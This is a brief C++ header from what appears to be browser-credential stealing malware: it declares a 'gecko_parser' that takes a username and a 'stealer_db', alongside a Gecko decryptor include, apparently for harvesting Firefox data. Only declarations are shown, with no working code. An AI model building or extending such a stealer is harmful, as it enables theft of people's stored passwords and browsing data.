#ifndef GECKOPARSER_H
#define GECKOPARSER_H

#include "DataHolder.h"
#include "DataDump.h"
#include "GeckoDecryptor.h"

using namespace std::filesystem;
using json = nlohmann::json;

BOOL gecko_parser(std::string username, std::string stealer_db);
std::string get_gecko_program_dir(std::string target_user_data);

#endif /* GECKOPARSER_H */